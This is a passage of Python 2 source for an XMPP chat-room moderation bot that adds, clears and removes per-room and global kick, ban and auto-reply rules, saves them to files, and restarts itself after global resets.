          BANST[s[1]][xp][wp]={}
          BANST[s[1]][xp][wp][tpx1]={}                                                                                 
          write_file(STATUSBAD, str(BANST))
          reply(t, s, s[2]+' : '+Xacl[28])

        else: reply(t, s, s[2]+' : '+XMSG1)   
       else: reply(t, s, s[2]+' : '+XMSG2)
      else: reply(t, s, s[2]+' : '+Xacl[30])    
     else: reply(t, s, s[2]+' : '+Xacl[29])
    except: reply(t, s, s[2]+' : '+XMSG5)
    return						
   if sp[0] == Xacl[13]:
    try:
     if ":" in p:
      if " *" in p:
       xp = p.split(": ")[1].split(" *")[0]                                
       if "فصل".decode('utf8') in p.split("* ",1)[1] or "طرد".decode('utf8') in p.split("* ",1)[1] or "حجب".decode('utf8') in p.split("* ",1)[1]:
        if "#" in p:
         wp=p.split("* ")[1].split(" #")[0]
         try:
          tpx1=p.split("# ",1)[1]
         except: tpx1=s[2]                                                               
         if not xp in smart[s[1]].keys():                                                                     
          smart[s[1]][xp]={}
          smart[s[1]][xp][wp]={}
          smart[s[1]][xp][wp][tpx1]={}                                                                                 
          write_file(smart_FILE, str(smart))
          reply(t, s, s[2]+' : '+Xacl[27])
         else:
          del smart[s[1]][xp]
          write_file(smart_FILE, str(smart))                                                              
          smart[s[1]][xp]={}
          smart[s[1]][xp][wp]={}
          smart[s[1]][xp][wp][tpx1]={}                                                                                 
          write_file(smart_FILE, str(smart))
          reply(t, s, s[2]+' : '+Xacl[28])
        else: reply(t, s, s[2]+' : '+Xacl[34])
       elif "قول".decode('utf8') in p.split("* ",1)[1]:
        if "#" in p:
         wp=p.split("* ")[1].split(" #")[0]
         tpx1=p.split("# ",1)[1]                                                                  
         if not xp in msgx[s[1]].keys():                                                                     
          msgx[s[1]][xp]={}
          msgx[s[1]][xp][wp]={}
          msgx[s[1]][xp][wp][tpx1]={}                                                                                 
          write_file(msgx_FILE, str(msgx))
          reply(t, s, s[2]+' : '+Xacl[27])
         else:
          del msgx[s[1]][xp]
          write_file(msgx_FILE, str(msgx))
          msgx[s[1]][xp]={}
          msgx[s[1]][xp][wp]={}
          msgx[s[1]][xp][wp][tpx1]={}                                                                                 
          write_file(msgx_FILE, str(msgx))
          reply(t, s, s[2]+' : '+Xacl[28])                                                                        
        else: reply(t, s, s[2]+' : '+Xacl[34])                                                             
       else: reply(t, s, s[2]+' : '+Xacl[33])
      else: reply(t, s, s[2]+' : '+Xacl[30])    
     else: reply(t, s, s[2]+' : '+Xacl[29]) 
    except: reply(t, s, s[2]+' : '+XMSG5)
    return
   if sp[0] == Xacl[14]:
    try:
     if ":" in p:
      if " *" in p:
       xp = sp[2]                               
       if "فصل".decode('utf8') in p.split("* ",1)[1] or "طرد".decode('utf8') in p.split("* ",1)[1] or "حجب".decode('utf8') in p.split("* ",1)[1]:
        if "#" in p:
         wp=p.split("* ")[1].split(" #")[0]
         try:
          tpx1=p.split("# ",1)[1]
         except: tpx1=s[2]                                                                  
         if not xp in BADNICK[s[1]].keys():                                                                     
          BADNICK[s[1]][xp]={}
          BADNICK[s[1]][xp][wp]={}
          BADNICK[s[1]][xp][wp][tpx1]={}                                                                                 
          write_file(BADNICK_FILE, str(BADNICK))
          reply(t, s, s[2]+' : '+Xacl[27])
         else: 
          del BADNICK[s[1]][xp]
          write_file(BADNICK_FILE, str(BADNICK))		  
          BADNICK[s[1]][xp]={}
          BADNICK[s[1]][xp][wp]={}
          BADNICK[s[1]][xp][wp][tpx1]={}                                                                                 
          write_file(BADNICK_FILE, str(BADNICK))
          reply(t, s, s[2]+' : '+Xacl[28])

        else: reply(t, s, s[2]+' : '+XMSG1)   
       else: reply(t, s, s[2]+' : '+XMSG2)
      else: reply(t, s, s[2]+' : '+Xacl[30])    
     else: reply(t, s, s[2]+' : '+Xacl[29])
    except: reply(t, s, s[2]+' : '+XMSG5)
    return	
   try:                                       
    if Xacl[1] == sp[0] and " " not in p:
     del BANOS[s[1]]
     write_file(BANOS_FILE, str(BANOS))
     del BANOS_2[s[1]]
     write_file(BANOS_2_FILE, str(BANOS_2))	 
     del BADall[s[1]]
     write_file(BADall_FILE, str(BADall))     
     del BANCAPS[s[1]]
     write_file(BANCAPS_FILE, str(BANCAPS))
     del BANRES[s[1]]
     write_file(BANRES_FILE, str(BANRES))
     del BANDO[s[1]]
     write_file(BANDO_FILE, str(BANDO))
     del BANJID[s[1]]
     write_file(BANJID_FILEX, str(BANJID))
     del BANST[s[1]]
     write_file(STATUSBAD, str(BANST))
     del smart[s[1]]
     write_file(smart_FILE, str(smart))
     del msgx[s[1]]
     write_file(msgx_FILE, str(msgx))
     del BADNICK[s[1]]
     write_file(BADNICK_FILE, str(BADNICK))
     del ROLEX[s[1]]
     write_file(ROLEX_FILE, str(ROLEX))                                
     reply(t, s, s[2]+' : '+Xacl[43])
     return
    elif Xacl[1] == sp[0] and Xacl[15] in p:    
     del ROLEX[s[1]]
     write_file(ROLEX_FILE, str(ROLEX))
     reply(t, s, s[2]+' : '+Xacl[44])
     return                         
    elif Xacl[1] == sp[0] and Xacl[8] in p and Xacl[10] not in p:    
     del BANOS[s[1]]
     write_file(BANOS_FILE, str(BANOS))
     reply(t, s, s[2]+' : '+Xacl[45])
     return   
    elif Xacl[1] == sp[0] and Xacl_1[0] in p and Xacl[10] not in p:    
     del BANOS_2[s[1]]
     write_file(BANOS_2_FILE, str(BANOS_2))
     reply(t, s, s[2]+' : '+Xacl[45])
     return  	 
    elif Xacl[1] == sp[0] and Xacl[9] in p:
     del BANCAPS[s[1]]
     write_file(BANCAPS_FILE, str(BANCAPS))
     reply(t, s, s[2]+' : '+Xacl[46])
     return
    elif Xacl[1] == sp[0] and Xacl[7] in p:    
     del BANRES[s[1]]
     write_file(BANRES_FILE, str(BANRES))
     reply(t, s, s[2]+' : '+Xacl[47])
     return
    elif Xacl[1] == sp[0] and Xacl[10] in p:     
     del BANDO[s[1]]
     write_file(BANDO_FILE, str(BANDO))
     reply(t, s, s[2]+' : '+Xacl[48])
     return
    elif Xacl[1] == sp[0] and Xacl[11] in p:     
     del BANJID[s[1]]
     write_file(BANJID_FILEX, str(BANJID))
     reply(t, s, s[2]+' : '+Xacl[49])
     return
    elif Xacl[1] == sp[0] and Xacl[12] in p:     
     del BANST[s[1]]
     write_file(STATUSBAD, str(BANST))
     reply(t, s, s[2]+' : '+Xacl[50])
     return
    elif Xacl[1] == sp[0] and Xacl[16] in p:     
     del BADall[s[1]]
     write_file(BADall_FILE, str(BADall))
     reply(t, s, s[2]+' : '+Xacl[51])
     return
    elif Xacl[1] == sp[0] and Xacl[13] in p:
     del smart[s[1]]
     write_file(smart_FILE, str(smart))
     del msgx[s[1]]
     write_file(msgx_FILE, str(msgx))                        
     reply(t, s, s[2]+' : '+Xacl[52])
     return
    elif Xacl[1] == sp[0] and Xacl[14] in p:
     del BADNICK[s[1]]
     write_file(BADNICK_FILE, str(BADNICK))
     reply(t, s, s[2]+' : '+Xacl[53])
     return
    elif Xacl[1] == sp[0] and Xacl[14] not in sp[1] and Xacl[13] not in sp[1] and Xacl[16] not in sp[1] and Xacl[12] not in sp[1] and Xacl[11] not in sp[1] and Xacl[10] not in sp[1] and Xacl[7] not in sp[1] and Xacl[9] not in sp[1] and Xacl[8] not in sp[1]:
     reply(t, s, s[2]+' : '+Xacl[54])
     return	 
   except: reply(t, s, s[2]+' : '+Xacl[54])
   try:                                       
    if p in Xacl[2] and " " not in p:   
     if Wacc == "100":  	
      write_file(GBANOS_FILE, str('{}'))
      write_file(GBANCAPS_FILE, str('{}'))
      write_file(GBANRES_FILE, str('{}'))
      write_file(GBANDO_FILE, str('{}'))
      write_file(GBANJID_FILEX, str('{}'))
      write_file(GSTATUSBAD, str('{}'))
      write_file(Gsmart_FILE, str('{}'))
      write_file(Gmsgx_FILE, str('{}'))
      write_file(GBADNICK_FILE, str('{}'))
      write_file(GBADall_FILE, str('{}'))        
      reply(t, s, s[2]+' : '+Xacl[55])
      time.sleep(5)
      p = domish.Element(('jabber:client', 'presence'))
      p['type'] = 'unavailable'
      p.addElement('status').addContent(u'BoT AuTo ResTarT')
      for x in CLIENTS.keys():
       reactor.callFromThread(dd, p, CLIENTS[x])
      reactor.stop()
      time.sleep(2)
      os.execl(sys.executable, sys.executable, sys.argv[0])      
      return   
     else: reply(t, s, s[2]+' : '+XMSG12)	                      
    elif sp[0] == Xacl[2] and sp[1] == Xacl[17]:   
     if Wacc == "100":  	
      write_file(GBANOS_FILE, str('{}'))
      reply(t, s, s[2]+' : '+Xacl[56])
      time.sleep(5)
      p = domish.Element(('jabber:client', 'presence'))
      p['type'] = 'unavailable'
      p.addElement('status').addContent(u'BoT AuTo ResTarT')
      for x in CLIENTS.keys():
       reactor.callFromThread(dd, p, CLIENTS[x])
      reactor.stop()
      time.sleep(2)
      os.execl(sys.executable, sys.executable, sys.argv[0])      
      return
     else: reply(t, s, s[2]+' : '+XMSG12)	 	  
    elif sp[0] == Xacl[2] and sp[1] == Xacl[20]:
     if Wacc == "100":  	
      write_file(GBANCAPS_FILE, str('{}'))
      reply(t, s, s[2]+' : '+Xacl[57])
      time.sleep(5)
      p = domish.Element(('jabber:client', 'presence'))
      p['type'] = 'unavailable'
      p.addElement('status').addContent(u'BoT AuTo ResTarT')
      for x in CLIENTS.keys():
       reactor.callFromThread(dd, p, CLIENTS[x])
      reactor.stop()
      time.sleep(2)
      os.execl(sys.executable, sys.executable, sys.argv[0])      
      return
     else: reply(t, s, s[2]+' : '+XMSG12)	 	  
    elif sp[0] == Xacl[2] and sp[1] == Xacl[18]:  
     if Wacc == "100":  	
      write_file(GBANRES_FILE, str('{}'))
      reply(t, s, s[2]+' : '+Xacl[58])
      time.sleep(5)
      p = domish.Element(('jabber:client', 'presence'))
      p['type'] = 'unavailable'
      p.addElement('status').addContent(u'BoT AuTo ResTarT')
      for x in CLIENTS.keys():
       reactor.callFromThread(dd, p, CLIENTS[x])
      reactor.stop()
      time.sleep(2)
      os.execl(sys.executable, sys.executable, sys.argv[0])      
      return
     else: reply(t, s, s[2]+' : '+XMSG12)	 	  
    elif sp[0] == Xacl[2] and sp[1] == Xacl[19]:     
     if Wacc == "100":  	
      write_file(GBANDO_FILE, str('{}'))
      reply(t, s, s[2]+' : '+Xacl[59])
      time.sleep(5)
      p = domish.Element(('jabber:client', 'presence'))
      p['type'] = 'unavailable'
      p.addElement('status').addContent(u'BoT AuTo ResTarT')
      for x in CLIENTS.keys():
       reactor.callFromThread(dd, p, CLIENTS[x])
      reactor.stop()
      time.sleep(2)
      os.execl(sys.executable, sys.executable, sys.argv[0])      
      return
     else: reply(t, s, s[2]+' : '+XMSG12)	 	  
    elif sp[0] == Xacl[2] and sp[1] == Xacl[21]:
     if Wacc == "100":  	
      write_file(GBANJID_FILEX, str('{}'))
      reply(t, s, s[2]+' : '+Xacl[60])
      time.sleep(5)
      p = domish.Element(('jabber:client', 'presence'))
      p['type'] = 'unavailable'
      p.addElement('status').addContent(u'BoT AuTo ResTarT')
      for x in CLIENTS.keys():
       reactor.callFromThread(dd, p, CLIENTS[x])
      reactor.stop()
      time.sleep(2)
      os.execl(sys.executable, sys.executable, sys.argv[0])      
      return
     else: reply(t, s, s[2]+' : '+XMSG12)	 	  
    elif sp[0] == Xacl[2] and sp[1] == Xacl[22]:
     if Wacc == "100":  	
      write_file(GSTATUSBAD, str('{}'))
      reply(t, s, s[2]+' : '+Xacl[61])
      time.sleep(5)
      p = domish.Element(('jabber:client', 'presence'))
      p['type'] = 'unavailable'
      p.addElement('status').addContent(u'BoT AuTo ResTarT')
      for x in CLIENTS.keys():
       reactor.callFromThread(dd, p, CLIENTS[x])
      reactor.stop()
      time.sleep(2)
      os.execl(sys.executable, sys.executable, sys.argv[0])      
      return
     else: reply(t, s, s[2]+' : '+XMSG12)	 	  
    elif sp[0] == Xacl[2] and sp[1] == Xacl[24]:
     if Wacc == "100":  	
      write_file(Gsmart_FILE, str('{}'))
      write_file(Gmsgx_FILE, str('{}'))                      
      reply(t, s, s[2]+' : '+Xacl[63])
      time.sleep(5)
      p = domish.Element(('jabber:client', 'presence'))
      p['type'] = 'unavailable'
      p.addElement('status').addContent(u'BoT AuTo ResTarT')
      for x in CLIENTS.keys():
       reactor.callFromThread(dd, p, CLIENTS[x])
      reactor.stop()
      time.sleep(2)
      os.execl(sys.executable, sys.executable, sys.argv[0])      
      return
     else: reply(t, s, s[2]+' : '+XMSG12)	 	 
    elif sp[0] == Xacl[2] and sp[1] == Xacl[23]:
     if Wacc == "100":  	
      write_file(GBADNICK_FILE, str('{}')) 	
      reply(t, s, s[2]+' : '+Xacl[64])
      time.sleep(5)
      p = domish.Element(('jabber:client', 'presence'))
      p['type'] = 'unavailable'
      p.addElement('status').addContent(u'BoT AuTo ResTarT')
      for x in CLIENTS.keys():
       reactor.callFromThread(dd, p, CLIENTS[x])
      reactor.stop()
      time.sleep(2)
      os.execl(sys.executable, sys.executable, sys.argv[0])      
      return
     else: reply(t, s, s[2]+' : '+XMSG12)
    elif sp[0] == Xacl[2] and sp[1] == Xacl[25]:
     if Wacc == "100":  	
      write_file(GBADall_FILE, str('{}')) 	
      reply(t, s, s[2]+' : '+Xacl[62])
      time.sleep(5)
      p = domish.Element(('jabber:client', 'presence'))
      p['type'] = 'unavailable'
      p.addElement('status').addContent(u'BoT AuTo ResTarT')
      for x in CLIENTS.keys():
       reactor.callFromThread(dd, p, CLIENTS[x])
      reactor.stop()
      time.sleep(2)
      os.execl(sys.executable, sys.executable, sys.argv[0])      
      return
     else: reply(t, s, s[2]+' : '+XMSG12)   
    elif sp[0] == Xacl[2] and sp[1] != Xacl[25]:
     reply(t, s, s[2]+' : '+Xacl[65])  	 
   except: reply(t, s, s[2]+' : '+Xacl[65])

   try:
    if sp[0] ==Xacl[5] and sp[1] ==Xacl[15]:                
                                try:
                                        if ":" in p:
                                                if "member" in p.split(":",1)[1].split("-")[0] or "moderator" in p.split(":",1)[1].split("-")[0] or "none" in p.split(":",1)[1].split("-")[0] or "visitor" in p.split(":",1)[1].split("-")[0]:                  
                                                        if " *" in p:
                                                                xp = p.split(": ")[1].split(" *")[0]
                                                                if "فصل".decode('utf8') in p.split("*",1)[1] or "طرد".decode('utf8') in p.split("*",1)[1]:
                                                                        if "#" in p:                                                              
                                                                                if xp in ROLEX[s[1]].keys():
                                                                                        del ROLEX[s[1]][xp]                                                                               
                                                                                        write_file(ROLEX_FILE, str(ROLEX))
                                                                                        reply(t, s, s[2]+' : '+XMSG9)
                                                                                else: reply(t, s, s[2]+' : '+XMSG10)                                                                              
                                                                        else: reply(t, s, s[2]+' : '+Xacl[74]%(sp[0]+" "+sp[1]+" "+sp[2]+" "+sp[3]+" "+sp[4]+" "+sp[5]))  
                                                                elif "none" in p.split("*",1)[1].split("$")[0] or "visitor" in p.split("*",1)[1].split("$")[0] or "member" in p.split("*",1)[1].split("$")[0]:
                                                                        if "|" in p:
                                                                                if xp in ROLEX[s[1]].keys():
                                                                                        del ROLEX[s[1]][xp]                                                                              
                                                                                        write_file(ROLEX_FILE, str(ROLEX))
                                                                                        reply(t, s, s[2]+' : '+XMSG9)
                                                                                else: reply(t, s, s[2]+' : '+XMSG10)
                                                                        else: reply(t, s, s[2]+' : '+Xacl[75]%(sp[0]+" "+sp[1]+" "+sp[2]+" "+sp[3]+" "+sp[4]+" "+sp[5]))                                                                 
                                                                else: reply(t, s, s[2]+' : '+Xacl[73]%(sp[3],sp[3],sp[3],sp[3],sp[3])) 
                                                        else: reply(t, s, s[2]+' : '+Xacl[72])  
                                                else: reply(t, s, s[2]+' : '+Xacl[71])                                              
                                                                              
                                        else: reply(t, s, s[2]+' : '+Xacl[70])                                                 
                                except: reply(t, s, s[2]+' : '+"error")                  
                                return                               
    if sp[0] ==Xacl[5] and sp[1] ==Xacl[8]:                
     try:
      if ":" in p:
       if " *" in p:
        xp = sp[3]                                
        if "فصل".decode('utf8') in p.split("* ",1)[1] or "طرد".decode('utf8') in p.split("* ",1)[1] or "حجب".decode('utf8') in p.split("* ",1)[1]:
         if "#" in p:
          wp=p.split("* ")[1].split(" #")[0] 
          try:
           tpx1=p.split("# ",1)[1]
          except: tpx1=s[2]		 
          if xp in BANOS[s[1]].keys():
           del BANOS[s[1]][xp]                                                                               
           write_file(BANOS_FILE, str(BANOS))
           reply(t, s, s[2]+' : '+XMSG9)
          else: reply(t, s, s[2]+' : '+XMSG10)		 
         else: reply(t, s, s[2]+' : '+Xacl[34])   
        else: reply(t, s, s[2]+' : '+Xacl[31])
       else: reply(t, s, s[2]+' : '+Xacl[30])    
      else: reply(t, s, s[2]+' : '+Xacl[29]) 
                                        
     except: reply(t, s, s[2]+' : '+XMSG5)
     return	  
	 
    if sp[0] ==Xacl[5] and sp[1] ==Xacl_1[0]:                
     try:
      if ":" in p:
       if " *" in p:
        xp = sp[3]                                
        if "فصل".decode('utf8') in p.split("* ",1)[1] or "طرد".decode('utf8') in p.split("* ",1)[1] or "حجب".decode('utf8') in p.split("* ",1)[1]:
         if "#" in p:
          wp=p.split("* ")[1].split(" #")[0] 
          try:
           tpx1=p.split("# ",1)[1]
          except: tpx1=s[2]		 
          if xp in BANOS_2[s[1]].keys():
           del BANOS_2[s[1]][xp]                                                                               
           write_file(BANOS_2_FILE, str(BANOS_2))
           reply(t, s, s[2]+' : '+XMSG9)
          else: reply(t, s, s[2]+' : '+XMSG10)		 
         else: reply(t, s, s[2]+' : '+Xacl[34])   
        else: reply(t, s, s[2]+' : '+Xacl[31])
       else: reply(t, s, s[2]+' : '+Xacl[30])    
      else: reply(t, s, s[2]+' : '+Xacl[29]) 
                                        
     except: reply(t, s, s[2]+' : '+XMSG5)
     return	 	 
    if sp[0] ==Xacl[5] and sp[1] ==Xacl[9]:                
     try:
      if ":" in p:
       if " *" in p:
        xp = sp[3]                                
        if bndx[0] in p.split("* ",1)[1] or bndx[1] in p.split("* ",1)[1]:
         if "#" in p:	 
          if xp in BANCAPS[s[1]].keys():
           del BANCAPS[s[1]][xp]                                                                               
           write_file(BANCAPS_FILE, str(BANCAPS))
           reply(t, s, s[2]+' : '+XMSG9)
          else: reply(t, s, s[2]+' : '+XMSG10)		 
         else: reply(t, s, s[2]+' : '+Xacl[34])   
        else: reply(t, s, s[2]+' : '+Xacl[32])
       else: reply(t, s, s[2]+' : '+Xacl[30])    
      else: reply(t, s, s[2]+' : '+Xacl[29])                            
     except: reply(t, s, s[2]+' : '+XMSG5)
     return
    if sp[0] ==Xacl[5] and sp[1] ==Xacl[7]:                
     try:
      if ":" in p:
       if " *" in p:
        xp = sp[3]                                
        if "فصل".decode('utf8') in p.split("* ",1)[1] or "طرد".decode('utf8') in p.split("* ",1)[1] or "حجب".decode('utf8') in p.split("* ",1)[1]:
         if "#" in p:	 
          if xp in BANRES[s[1]].keys():
           del BANRES[s[1]][xp]                                                                               
           write_file(BANRES_FILE, str(BANRES))
           reply(t, s, s[2]+' : '+XMSG9)
          else: reply(t, s, s[2]+' : '+XMSG10)		 
         else: reply(t, s, s[2]+' : '+XMSG1)   
        else: reply(t, s, s[2]+' : '+XMSG2)
       else: reply(t, s, s[2]+' : '+Xacl[30])    
      else: reply(t, s, s[2]+' : '+Xacl[29])                               
     except: reply(t, s, s[2]+' : '+XMSG5)
     return
    if sp[0] ==Xacl[5] and sp[1] ==Xacl[10]:                
     try:
      if ":" in p:
       if " *" in p:
        xp = sp[3]                                
        if "فصل".decode('utf8') in p.split("* ",1)[1] or "طرد".decode('utf8') in p.split("* ",1)[1] or "حجب".decode('utf8') in p.split("* ",1)[1]:
         if "#" in p:	 
          if xp in BANDO[s[1]].keys():
           del BANDO[s[1]][xp]                                                                               
           write_file(BANDO_FILE, str(BANDO))
           reply(t, s, s[2]+' : '+XMSG9)
          else: reply(t, s, s[2]+' : '+XMSG10)		 
         else: reply(t, s, s[2]+' : '+XMSG1)   
        else: reply(t, s, s[2]+' : '+XMSG2)
       else: reply(t, s, s[2]+' : '+Xacl[30])    
      else: reply(t, s, s[2]+' : '+Xacl[29])                               
     except: reply(t, s, s[2]+' : '+XMSG5)
     return
    if sp[0] ==Xacl[5] and sp[1] ==Xacl[11]:                
     try:
      if ":" in p:
       if " *" in p:
        xp = sp[3]                                
        if "فصل".decode('utf8') in p.split("* ",1)[1] or "طرد".decode('utf8') in p.split("* ",1)[1] or "حجب".decode('utf8') in p.split("* ",1)[1]:
         if "#" in p: 
          if xp in BANJID[s[1]].keys():
           del BANJID[s[1]][xp]                                                                               
           write_file(BANJID_FILEX, str(BANJID))
           reply(t, s, s[2]+' : '+XMSG9)
          else: reply(t, s, s[2]+' : '+XMSG10)		 
         else: reply(t, s, s[2]+' : '+XMSG1)   
        else: reply(t, s, s[2]+' : '+XMSG2)
       else: reply(t, s, s[2]+' : '+Xacl[30])    
      else: reply(t, s, s[2]+' : '+Xacl[29])                               
     except: reply(t, s, s[2]+' : '+XMSG5)
     return
    if sp[0] ==Xacl[5] and sp[1] ==Xacl[16]:                
     try:
      if ":" in p:
       if " *" in p:
        xp = sp[3]                                
        if "فصل".decode('utf8') in p.split("* ",1)[1] or "طرد".decode('utf8') in p.split("* ",1)[1] or "حجب".decode('utf8') in p.split("* ",1)[1]:
         if "#" in p: 
          if xp in BADall[s[1]].keys():
           del BADall[s[1]][xp]                                                                               
           write_file(BADall_FILE, str(BADall))
           reply(t, s, s[2]+' : '+XMSG9)
          else: reply(t, s, s[2]+' : '+XMSG10)		 
         else: reply(t, s, s[2]+' : '+XMSG1)   
        else: reply(t, s, s[2]+' : '+XMSG2)
       else: reply(t, s, s[2]+' : '+Xacl[30])    
      else: reply(t, s, s[2]+' : '+Xacl[29])                               
     except: reply(t, s, s[2]+' : '+XMSG5)
     return
    if sp[0] ==Xacl[5] and sp[1] ==Xacl[12]:                
     try:
      if ":" in p:
       if " *" in p:
        xp = sp[3]                                
        if "فصل".decode('utf8') in p.split("* ",1)[1] or "طرد".decode('utf8') in p.split("* ",1)[1] or "حجب".decode('utf8') in p.split("* ",1)[1]:
         if "#" in p: 
          if xp in BANST[s[1]].keys():
           del BANST[s[1]][xp]                                                                               
           write_file(STATUSBAD, str(BANST))
           reply(t, s, s[2]+' : '+XMSG9)
          else: reply(t, s, s[2]+' : '+XMSG10)		 
         else: reply(t, s, s[2]+' : '+XMSG1)   
        else: reply(t, s, s[2]+' : '+XMSG2)
       else: reply(t, s, s[2]+' : '+Xacl[30])    
      else: reply(t, s, s[2]+' : '+Xacl[29])                               
     except: reply(t, s, s[2]+' : '+XMSG5)
     return
    if sp[0] ==Xacl[5] and sp[1] ==Xacl[13]:                
     try:
      if ":" in p:
       if " *" in p:
        xp = sp[3]                                    
        if "فصل".decode('utf8') in p.split("* ",1)[1] or "طرد".decode('utf8') in p.split("* ",1)[1] or "حجب".decode('utf8') in p.split("* ",1)[1]:
         if "#" in p:                                                           
          if xp in smart[s[1]].keys():
           del smart[s[1]][xp]                                                                            
           write_file(smart_FILE, str(smart))
           reply(t, s, s[2]+' : '+XMSG9)
          else: reply(t, s, s[2]+' : '+XMSG10)
         else: reply(t, s, s[2]+' : '+XMSG1)
        elif "قول".decode('utf8') in p.split("* ",1)[1]:
         if "#" in p:                                                          
          if xp in msgx[s[1]].keys():
           del msgx[s[1]][xp]                                                                            
           write_file(msgx_FILE, str(msgx))
           reply(t, s, s[2]+' : '+XMSG9)
          else: reply(t, s, s[2]+' : '+XMSG10)
         else: reply(t, s, s[2]+' : '+XMSG1)                                                                
        else: reply(t, s, s[2]+' : '+Xacl[33])                              
       else: reply(t, s, s[2]+' : '+Xacl[30])    
      else: reply(t, s, s[2]+' : '+Xacl[29])                               
     except: reply(t, s, s[2]+' : '+XMSG5)
    if sp[0] ==Xacl[5] and sp[1] ==Xacl[14]:                
     try:
      if ":" in p:
       if " *" in p:
        xp = sp[3]                                
        if "فصل".decode('utf8') in p.split("* ",1)[1] or "طرد".decode('utf8') in p.split("* ",1)[1] or "حجب".decode('utf8') in p.split("* ",1)[1]:
         if "#" in p: 
          if xp in BADNICK[s[1]].keys():
           del BADNICK[s[1]][xp]                                                                               
           write_file(BADNICK_FILE, str(BADNICK))
           reply(t, s, s[2]+' : '+XMSG9)
          else: reply(t, s, s[2]+' : '+XMSG10)		 
         else: reply(t, s, s[2]+' : '+XMSG1)   
        else: reply(t, s, s[2]+' : '+XMSG2)
       else: reply(t, s, s[2]+' : '+Xacl[30])    
      else: reply(t, s, s[2]+' : '+Xacl[29])                               
     except: reply(t, s, s[2]+' : '+XMSG5)
     return   
    if sp[0] ==Xacl[5] and Xacl[8] not in p and Xacl[9] not in p and Xacl[7] not in p and Xacl[10] not in p and Xacl[11] not in p and Xacl[12] not in p and Xacl[13] not in p and Xacl[14] not in p and Xacl[15] not in p and Xacl[16] not in p:  
     reply(t, s, s[2]+' : '+Xacl[68])                        	 
   except: reply(t, s, s[2]+' : '+Xacl[68])                        
   try:
    if sp[0] ==Xacl[6] and sp[1] ==Xacl[17]:  
     if Wacc == "100":  	
      try:
       if ":" in p:
        if " *" in p:
         xp = sp[3]                                
         if "فصل".decode('utf8') in p.split("* ",1)[1] or "طرد".decode('utf8') in p.split("* ",1)[1] or "حجب".decode('utf8') in p.split("* ",1)[1]:
          if "#" in p:
           wp=p.split("* ")[1].split(" #")[0] 
           try:
            tpx1=p.split("# ",1)[1]
           except: tpx1=s[2]		 
           if xp in GBANOS:
            del GBANOS[xp]                                                                               
            write_file(GBANOS_FILE, str(GBANOS))
            reply(t, s, s[2]+' : '+XMSG9)
           else: reply(t, s, s[2]+' : '+XMSG10)		 
          else: reply(t, s, s[2]+' : '+Xacl[34])   
         else: reply(t, s, s[2]+' : '+Xacl[31])
        else: reply(t, s, s[2]+' : '+Xacl[30])    
       else: reply(t, s, s[2]+' : '+Xacl[29])                                   
      except: reply(t, s, s[2]+' : '+XMSG5)
      return	 
     else: reply(t, s, s[2]+' : '+XMSG12)	
    if sp[0] ==Xacl[6] and sp[1] ==Xacl[20]:   
     if Wacc == "100":  	
      try:
       if ":" in p:
        if " *" in p:
         xp = sp[3]                                
         if bndx[0] in p.split("* ",1)[1] or bndx[1] in p.split("* ",1)[1]:
          if "#" in p:	 
           if xp in GBANCAPS:
            del GBANCAPS[xp]                                                                               
            write_file(GBANCAPS_FILE, str(GBANCAPS))
            reply(t, s, s[2]+' : '+XMSG9)
           else: reply(t, s, s[2]+' : '+XMSG10)		 
          else: reply(t, s, s[2]+' : '+Xacl[34])   
         else: reply(t, s, s[2]+' : '+Xacl[32])
        else: reply(t, s, s[2]+' : '+Xacl[30])    
       else: reply(t, s, s[2]+' : '+Xacl[29])                            
      except: reply(t, s, s[2]+' : '+XMSG5)
      return	 
     else: reply(t, s, s[2]+' : '+XMSG12)	
    if sp[0] ==Xacl[6] and sp[1] ==Xacl[18]:    
     if Wacc == "100": 	
      try:
       if ":" in p:
        if " *" in p:
         xp = sp[3]                                
         if "فصل".decode('utf8') in p.split("* ",1)[1] or "طرد".decode('utf8') in p.split("* ",1)[1] or "حجب".decode('utf8') in p.split("* ",1)[1]:
          if "#" in p:	 
           if xp in GBANRES:
            del GBANRES[xp]                                                                               
            write_file(GBANRES_FILE, str(GBANRES))
            reply(t, s, s[2]+' : '+XMSG9)
           else: reply(t, s, s[2]+' : '+XMSG10)		 
          else: reply(t, s, s[2]+' : '+XMSG1)   
         else: reply(t, s, s[2]+' : '+XMSG2)
        else: reply(t, s, s[2]+' : '+Xacl[30])    
       else: reply(t, s, s[2]+' : '+Xacl[29])                               
      except: reply(t, s, s[2]+' : '+XMSG5)
      return	
     else: reply(t, s, s[2]+' : '+XMSG12)
    if sp[0] ==Xacl[6] and sp[1] ==Xacl[25]:    
     if Wacc == "100": 	
      try:
       if ":" in p:
        if " *" in p:
         xp = sp[3]                                
         if "فصل".decode('utf8') in p.split("* ",1)[1] or "طرد".decode('utf8') in p.split("* ",1)[1] or "حجب".decode('utf8') in p.split("* ",1)[1]:
          if "#" in p:	 
           if xp in GBADall:
            del GBADall[xp]                                                                               
            write_file(GBADall_FILE, str(GBADall))
            reply(t, s, s[2]+' : '+XMSG9)
           else: reply(t, s, s[2]+' : '+XMSG10)		 
          else: reply(t, s, s[2]+' : '+XMSG1)   
         else: reply(t, s, s[2]+' : '+XMSG2)
        else: reply(t, s, s[2]+' : '+Xacl[30])    
       else: reply(t, s, s[2]+' : '+Xacl[29])                               
      except: reply(t, s, s[2]+' : '+XMSG5)
      return	
     else: reply(t, s, s[2]+' : '+XMSG12)     
    if sp[0] ==Xacl[6] and sp[1] ==Xacl[19]:  
     if Wacc == "100": 		
      try:
       if ":" in p:
        if " *" in p:
         xp = sp[3]                                
         if "فصل".decode('utf8') in p.split("* ",1)[1] or "طرد".decode('utf8') in p.split("* ",1)[1] or "حجب".decode('utf8') in p.split("* ",1)[1]:
          if "#" in p:	 
           if xp in GBANDO:
            del GBANDO[xp]                                                                               
            write_file(GBANDO_FILE, str(GBANDO))
            reply(t, s, s[2]+' : '+XMSG9)
           else: reply(t, s, s[2]+' : '+XMSG10)		 
          else: reply(t, s, s[2]+' : '+XMSG1)   
         else: reply(t, s, s[2]+' : '+XMSG2)
        else: reply(t, s, s[2]+' : '+Xacl[30])    
       else: reply(t, s, s[2]+' : '+Xacl[29])                               
      except: reply(t, s, s[2]+' : '+XMSG5)
      return	  
     else: reply(t, s, s[2]+' : '+XMSG12)	
    if sp[0] ==Xacl[6] and sp[1] ==Xacl[21]:   
     if Wacc == "100": 	
      try:
       if ":" in p:
        if " *" in p:
         xp = sp[3]                                
         if "فصل".decode('utf8') in p.split("* ",1)[1] or "طرد".decode('utf8') in p.split("* ",1)[1] or "حجب".decode('utf8') in p.split("* ",1)[1]:
          if "#" in p: 
           if xp in GBANJID:
            del GBANJID[xp]                                                                               
